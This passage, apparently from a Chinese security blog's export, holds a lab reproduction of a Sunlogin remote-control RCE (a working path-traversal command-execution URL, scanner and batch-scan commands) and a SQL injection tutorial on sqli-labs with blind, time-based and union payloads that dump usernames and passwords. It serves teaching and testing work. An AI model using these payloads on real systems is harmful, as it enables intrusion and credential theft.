href="#漏洞级别" class="headerlink" title="漏洞级别"></a>漏洞级别</h3><p><strong>高危</strong></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在虚拟机里安装11.0.0.33的低版本向日葵</p><p><img src="https://s2.loli.net/2023/03/29/nYfVZ2ULrPuE85I.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/nYfVZ2ULrPuE85I.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230219135253229"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>使用nmap或其他工具探测目标端口</p><p><img src="https://s2.loli.net/2023/03/29/d8BOl9vWjsfwGrm.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/d8BOl9vWjsfwGrm.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230219135507131"></p><p>在浏览器中访问ip+端口号+cgi-bin&#x2F;rpc?action&#x3D;verify-haras  （端口号：每一个都尝试，直到获取到session值CID）</p><p><img src="https://s2.loli.net/2023/03/29/jg3EFkQN9ciVDOM.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/jg3EFkQN9ciVDOM.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230219151000880"></p><p>Cookies添加拿到的CID后加上payload请求</p><p><code>http://192.168.52.133:49437/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+ whoami</code></p><p><img src="https://s2.loli.net/2023/03/29/IMBCb6R7mZqFlTU.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/IMBCb6R7mZqFlTU.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230219151000880"></p><p><img src="https://s2.loli.net/2023/03/29/FluGp8dAs2xzeBO.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/FluGp8dAs2xzeBO.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230219151134780"></p><p>手动复现完成</p><h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><p>使用工具自带的扫描</p><p><code>xrkRce.exe</code> -h ip -t scan</p><p><img src="https://s2.loli.net/2023/03/29/8k4Dbr9FI3CTadt.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/8k4Dbr9FI3CTadt.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230219152233952"></p><p>测试命令执行</p><p><img src="https://s2.loli.net/2023/03/29/KUBEF3bq6nfHNW9.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/KUBEF3bq6nfHNW9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230219153035239"></p><h3 id="批量检测"><a href="#批量检测" class="headerlink" title="批量检测"></a>批量检测</h3><p><code>python3 sunlogin-fuzz.py -t 192.168.52.128/25</code></p><p><img src="https://s2.loli.net/2023/03/29/EtHfgymwTx5ZVI4.png" class="lazyload" data-srcset="https://s2.loli.net/2023/03/29/EtHfgymwTx5ZVI4.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230219162629384"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 向日葵 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见sql注入手法总结与技巧(一)</title>
      <link href="/2023/03/24/%E5%B8%B8%E8%A7%81sql%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93%E4%B8%8E%E6%8A%80%E5%B7%A7-%E4%B8%80/"/>
      <url>/2023/03/24/%E5%B8%B8%E8%A7%81sql%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93%E4%B8%8E%E6%8A%80%E5%B7%A7-%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>SQL 是 Structured Query Language 的缩写，中文译为“结构化查询语言”。SQL 是一种计算机语言，用来存储、检索和修改关系型数据库中存储的数据。</p><p>sql注入是最为常见也是破坏力很大的漏洞，它是因为开发在开发时没有对用户的输入行为进行判断和过滤，使得用户输入了恶意语句后传给了后端数据库进行相应的动作（如增删改查甚至写后门）。</p><p><strong>根本产生原因：</strong>后端服务器接收传来的参数未经过严格过滤判断而直接进入数据库查询</p><p>所以在学习SQL注入前需要了解SQL基础语法</p><h2 id="SQL注入根源分析"><a href="#SQL注入根源分析" class="headerlink" title="SQL注入根源分析"></a>SQL注入根源分析</h2><p>如果后台sql语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27; $id &#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>如果我们传入id&#x3D;1’  那么如果后端没有经过过滤而是直接把我们传入的参数带进sql语句中，那么sql语句就会变成：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;1&#x27;&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>我们传入的 ‘ 就会一块带入和前面的单引号进行闭合，导致原来后面的单引号就多余，而sql语句引号是必须成对出现的就会报错什么都查不出来，但如果我们在1’后面加入恶意语句并且把后面的原来的语句进行注解，就会造成sql语句会执行我们传入的恶意语句，实现注入。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">-1</span><span class="string">&#x27; union select database() #</span></span><br><span class="line"><span class="string">$sql=&quot;SELECT * FROM users WHERE id=&#x27;</span><span class="number">-1</span><span class="string">&#x27; union select database() #&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span>&quot;;</span><br></pre></td></tr></table></figure><p>-1表示查询一个不存在的id，是为了不影响后面我们的注入语句</p><p>#,–+,– 表示注释，把后面所有语句注释掉，这样就不会影响我们的注入语句</p><h2 id="sql参数类型分类"><a href="#sql参数类型分类" class="headerlink" title="sql参数类型分类"></a>sql参数类型分类</h2><p>SQL注入按照参数类型分类可分为两种：数字型和字符型</p><ol><li>数字型：select * from table where id&#x3D;2</li><li>字符型：select * from table where id&#x3D;’2’</li></ol><p>区别在于数字型不需要单引号进行闭合，而字符型一般需要通过单引号闭合。</p><p>判断类型方法：</p><p>​构造payload为：<code>id=1 order by 9999 --+</code></p><p>如果正确返回页面，则为字符型；否则，为数字型</p><p>​构造payload为：<code>1 and 1=2</code></p><p>如果正确返回页面，则为字符型；否则，为数字型</p><h2 id="常见sql注入手法"><a href="#常见sql注入手法" class="headerlink" title="常见sql注入手法"></a>常见sql注入手法</h2><p>这里先给出常用的payload，后面会使用到</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> database()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;xxxx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> group_concat(字段名) <span class="keyword">from</span> 表名</span><br></pre></td></tr></table></figure><h3 id="常见注入手法分类"><a href="#常见注入手法分类" class="headerlink" title="常见注入手法分类"></a>常见注入手法分类</h3><p>布尔盲注</p><p>时间盲注</p><p>union联合注入</p><p>报错注入</p><p>堆叠注入</p><p>二次注入</p><p>宽字节注入</p><p>通过sql注入写webshell</p><p>通过http header注入</p><p>…</p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>通常根据SQL注入是否有回显将其分为有回显的注入和无回显的注入，其中无回显的注入就是盲注。</p><p>我们的注入语句可能会让网页呈现两种状态，例如“查询成功”，“查询失败”，相当于true和false。也可能是一句“查询完成”或者什么都不说。虽然并不能直接得到数据库中的具体数据，但是SQL语句的拼接已经发生了，非法的SQL也执行了，SQL注入攻击就发生了，只是SQL注入的结果不能直接拿到。</p><p>盲注就是针对这种无回显的情况，盲注就像是爆破，在进行SQL盲注时，大致过程为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">如果&quot;数据库XX&quot;的第一个字母是a，就返回“查询成功”，否则返回“查询失败”</span><br><span class="line">如果&quot;数据库XX&quot;的第一个字母是b，就返回“查询成功”，否则返回“查询失败”</span><br><span class="line">如果&quot;数据库XX&quot;的第一个字母是c，就返回“查询成功”，否则返回“查询失败”</span><br><span class="line">...</span><br><span class="line">如果&quot;数据库XX&quot;的第二个字母是a，就返回“查询成功”，否则返回“查询失败”</span><br><span class="line">如果&quot;数据库XX&quot;的第二个字母是b，就返回“查询成功”，否则返回“查询失败”</span><br><span class="line">如果&quot;数据库XX&quot;的第二个字母是c，就返回“查询成功”，否则返回“查询失败”</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>通过这样不断的测试爆破，根据回显的“查询成功”和“查询失败”，判断出具体数据的每一位是什么，就可以完整的得到这个数据的具体值了。</p><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>下面使用sqli-labs靶场演示,less-8关</p><p>查询成功返回You are in….</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/24/3a4c28e9dd204283.png" class="lazyload" data-srcset="https://s3.bmp.ovh/imgs/2023/03/24/3a4c28e9dd204283.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>而查询失败则什么都不显示</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/24/8ad3a277135c7acd.png" class="lazyload" data-srcset="https://s3.bmp.ovh/imgs/2023/03/24/8ad3a277135c7acd.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>返回You are in….相当于是“查询成功”，而什么都没显示则相当于是“查询失败”。所以我们构造的判断语句，可以根据页面是否有You are in….来充当判断条件。</p><p><strong>要使用的sql函数：</strong></p><p>substr(要截取的字符串，从哪一位开始截取，截取多长)</p><p>ascii()返回传入字符串的首字母的ASCII码</p><p><strong>获取当前数据库名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.判断当前数据库名的长度</span><br><span class="line">id=1&#x27; and length(database())=8 --+  //有回显</span><br><span class="line">判断到等于8时出现You are in....说明语句执行正确，当前数据库长度为8个字符</span><br><span class="line"></span><br><span class="line">2.判断当前数据库名</span><br><span class="line">//判断数据库的第一个字符</span><br><span class="line">id=1&#x27; and ascii(substr(database(),1,1))=115 --+</span><br><span class="line">//判断数据库的第二个字符</span><br><span class="line">id=1&#x27; and ascii(substr(database(),2,1))=101 --+</span><br><span class="line">//判断数据库的第三个字符</span><br><span class="line">id=1&#x27; and ascii(substr(database(),3,1))=99 --+</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">数据库为 security</span><br></pre></td></tr></table></figure><p><strong>获取当前库的表名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">判断每个表名的每个字符的ascii值</span><br><span class="line">//判断第一个表的第一个字符</span><br><span class="line">id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+</span><br><span class="line"></span><br><span class="line">//判断第一个表的第二个字符</span><br><span class="line">id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109 --+</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">判断出存在表 emails、referers、uagents、users </span><br></pre></td></tr></table></figure><p><strong>获取表的字段</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">猜测users表比较重要，先查询users表</span><br><span class="line">//判断第一个字段的第一个字符</span><br><span class="line">id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))=117 --+</span><br><span class="line"></span><br><span class="line">//判断第一个字段的第二个字符</span><br><span class="line">id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),2,1))=115 --+</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">users表中存在 id、username、password 字段</span><br></pre></td></tr></table></figure><p><strong>获取字段中的数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//判断id字段的第一行数据的第一个字符</span><br><span class="line">id=1&#x27; and ascii(substr((select id from users limit  0,1),1,1))=100 --+</span><br><span class="line">//判断id字段的第二行数据的第二个字符</span><br><span class="line">id=1&#x27; and ascii(substr((select id from users limit 0,1),2,1))=100 --+</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>手工去盲注太过繁琐，不建议手工注入，可借助工具或者写脚本跑</p><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>时间盲注也叫<strong>延迟注入</strong>。在页面没有回显数据，也没有可以充当判断条件的地方，也没有报错信息，就可以考虑尝试时间盲注。时间盲注就是将页面的反响时间作为判断依据，来注入出数据库的信息。</p><p>以Less-9为例，当我们以id&#x3D;1’ and sleep(5) –+ 进行注入，可以明显的感觉到页面返回响应的时间变长了，大概拉长了5秒左右，这说明构造的sleep(5)语句起作用了。我们可以把这个当作判断依据，配合if语句使用。</p><p>if(a,b,c) 如果a的值为true，则返回b的值，如果a的值为false，则返回c的值。</p><p><strong>获取数据库名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//查询数据库名第一个字符</span><br><span class="line">id=1&#x27; and if(ascii(substr(database(),1,1))= 115,sleep(5),0) --+</span><br><span class="line">明显感受到页面延迟了几秒，说明数据库名字第一个字符是s。</span><br><span class="line">//查询数据库名第二个字符</span><br><span class="line">id=1&#x27; and if(ascii(substr(database(),2,1))= 101,sleep(5),0) --+</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>与盲注类似，后面就是爆破字符，再爆表名，字段名，具体数据。</p><p>不建议手注，建议编写脚本或使用工具</p><h3 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h3><p><strong>第一步</strong>，测试注入点，一些小技巧：利用引号，and 1&#x3D;1 ，or 1&#x3D;1 等判断是字符型还是数字型</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/24/c29b373007f5c9ec.png" class="lazyload" data-srcset="https://s3.bmp.ovh/imgs/2023/03/24/c29b373007f5c9ec.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>正常返回判断是字符型</p><p><strong>第二步</strong>，利用order by 查表得到到字段个数</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/24/4476b9da124a50d6.png" class="lazyload" data-srcset="https://s3.bmp.ovh/imgs/2023/03/24/4476b9da124a50d6.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://s3.bmp.ovh/imgs/2023/03/24/75b3fcab817513f8.png" class="lazyload" data-srcset="https://s3.bmp.ovh/imgs/2023/03/24/75b3fcab817513f8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>查到3时正常返回但到4时报错说明当前表中只有三列</p><p><strong>第三步</strong>，利用union select 1,2,3..判断回显位，如果有回显，找到回显位，回显位也就是回显页面有我们设置的1,2,3的位置</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/24/63630a55027325b4.png" class="lazyload" data-srcset="https://s3.bmp.ovh/imgs/2023/03/24/63630a55027325b4.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>发现者里有2和3的回显位,在name和Password回显</p><p><strong>第四步</strong>，爆库，爆表，爆字段名，爆值</p><p>为什么用-1 ：因为-1大概率会返回空表，union select联合查询会返回一张表，就只会显示后面联合查询表</p><p>组合使用上面提到的常用的payload，放在页面回显位上</p><p><code>-1&#39; union select 1,(select database()),3 --+</code></p><p><img src="https://s3.bmp.ovh/imgs/2023/03/24/7061e7b7819e2b40.png" class="lazyload" data-srcset="https://s3.bmp.ovh/imgs/2023/03/24/7061e7b7819e2b40.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><code>-1&#39; union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=database()),3 --+</code></p><p><img src="https://s3.bmp.ovh/imgs/2023/03/24/0cebe315f9203cec.png" class="lazyload" data-srcset="https://s3.bmp.ovh/imgs/2023/03/24/0cebe315f9203cec.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>爆出4个表，选择爆users表</p><p><code>-1&#39; union select 1,(select group_concat(column_name)from information_schema.columns where table_name=&#39;users&#39;),3 --+</code></p><p><img src="https://s3.bmp.ovh/imgs/2023/03/24/e0e70749fe594d15.png" class="lazyload" data-srcset="https://s3.bmp.ovh/imgs/2023/03/24/e0e70749fe594d15.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>发现查询出了很多字段应该爆错了不是我们需要的那个表，可能其他库里也有users表，这样要加一条限制语句，查security库里的users表</p><p><code>-1&#39; union select 1,(select group_concat(column_name)from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),3 --+</code></p><p><img src="https://s3.bmp.ovh/imgs/2023/03/24/8c414407018310c2.png" class="lazyload" data-srcset="https://s3.bmp.ovh/imgs/2023/03/24/8c414407018310c2.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>爆字段的数据</p><p><code>-1&#39; union select 1,(select group_concat(id,username,password) from users),3 --+</code></p><p><img src="https://s3.bmp.ovh/imgs/2023/03/24/b39f3864d2e582ae.png" class="lazyload" data-srcset="https://s3.bmp.ovh/imgs/2023/03/24/b39f3864d2e582ae.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,(select database()),3 --+</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">3</span> <span class="comment">--+</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),3 --+</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>),<span class="number">3</span> <span class="comment">--+</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(id,username,password) from users),3 --+</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入,安全基础 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
